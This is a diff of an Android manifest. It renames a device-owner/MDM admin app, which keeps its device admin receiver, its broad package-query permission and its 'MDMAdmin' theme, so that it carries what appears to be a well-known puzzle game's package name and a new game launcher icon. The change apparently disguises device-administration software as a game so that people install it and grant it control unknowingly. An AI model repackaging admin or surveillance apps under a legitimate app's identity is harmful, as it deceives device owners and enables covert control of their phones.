@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.mdm.deviceowner"
+    package="com.ninjakiwi.bloonspuzzle"
     android:versionCode="1"
     android:versionName="1.0" >
 
@@ -12,22 +12,23 @@
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
 
     <permission
-        android:name="com.mdm.deviceowner.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+        android:name="com.ninjakiwi.bloonspuzzle.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
         android:protectionLevel="signature" />
 
-    <uses-permission android:name="com.mdm.deviceowner.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
+    <uses-permission android:name="com.ninjakiwi.bloonspuzzle.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
 
     <application
         android:allowBackup="false"
         android:appComponentFactory="androidx.core.app.CoreComponentFactory"
         android:extractNativeLibs="false"
+        android:icon="@drawable/ic_launcher_game_new"
         android:label="@string/app_name"
         android:supportsRtl="true"
         android:theme="@style/Theme.MDMAdmin" >
 
         <!-- Setup/onboarding screen — this is the entry point -->
         <activity
-            android:name="com.mdm.deviceowner.SetupActivity"
+            android:name="com.ninjakiwi.bloonspuzzle.SetupActivity"
             android:exported="true" >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -38,13 +39,13 @@
 
         <!-- Main dashboard — only reachable after setup -->
         <activity
-            android:name="com.mdm.deviceowner.MainActivity"
+            android:name="com.ninjakiwi.bloonspuzzle.MainActivity"
             android:exported="false"
             android:windowSoftInputMode="adjustResize" />
 
         <!-- Device Admin Receiver -->
         <receiver
-            android:name="com.mdm.deviceowner.AdminReceiver"
+            android:name="com.ninjakiwi.bloonspuzzle.AdminReceiver"
             android:description="@string/app_description"
             android:exported="true"
             android:label="@string/app_name"
@@ -61,7 +62,7 @@
 
         <provider
             android:name="androidx.startup.InitializationProvider"
-            android:authorities="com.mdm.deviceowner.androidx-startup"
+            android:authorities="com.ninjakiwi.bloonspuzzle.androidx-startup"
             android:exported="false" >
             <meta-data
                 android:name="androidx.emoji2.text.EmojiCompatInitializer"
